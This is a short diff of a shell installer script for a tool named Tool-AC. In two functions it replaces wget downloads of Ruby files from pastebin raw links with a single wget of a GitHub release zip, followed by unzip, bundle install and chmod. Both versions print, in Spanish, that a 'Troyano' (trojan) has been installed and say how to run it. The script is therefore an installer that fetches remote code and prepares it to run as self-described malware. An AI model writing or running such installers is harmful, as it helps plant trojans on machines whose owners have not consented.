@@ -60,15 +60,9 @@ usern()
 	mkdir Tool-AC
 	cd Tool-AC
 	#ingresar link valido
-	wget https://pastebin.com/raw/Wd6GtStE;
-	mv Wd6GtStE main.rb;
-	wget https://pastebin.com/raw/bsEnkYtK;
-	mv bsEnkYtK Gemfile;
-	wget https://pastebin.com/raw/6ArXDz8L;
-	mv 6ArXDz8L Gemfile.lock;
-	mkdir 
-	echo "instalando gemas"
-	bundle
+	wget https://github.com/Kedap/Tool-AC/releases/download/Beta/Tool-AC_1.1.0-beta.zip;
+	unzip Tool-AC_1.1.0-beta.zip;
+	bundle install
 	chmod +x main.rb
 	echo "Troyano instalado con exito, para potenciarlo ejecuta:"
 	echo "Tool-AC/main.rb"
@@ -108,15 +102,10 @@ userd()
 	mkdir Tool-AC
 	cd Tool-AC
 	#ingresar link valido
-	wget https://pastebin.com/raw/Wd6GtStE;
-	mv Wd6GtStE main.rb;
-	wget https://pastebin.com/raw/bsEnkYtK;
-	mv bsEnkYtK Gemfile;
-	wget https://pastebin.com/raw/6ArXDz8L;
-	mv 6ArXDz8L Gemfile.lock;
-	mkdir 
+	wget https://github.com/Kedap/Tool-AC/releases/download/Beta/Tool-AC_1.1.0-beta.zip;
+	unzip Tool-AC_1.1.0-beta.zip;	
 	echo "instalando gemas"
-	bundle
+	bundle install
 	chmod +x main.rb
 	echo "Troyano instalado con exito, para potenciarlo ejecuta:"
 	echo "'ruby Tool-AC/codigo.rb'"
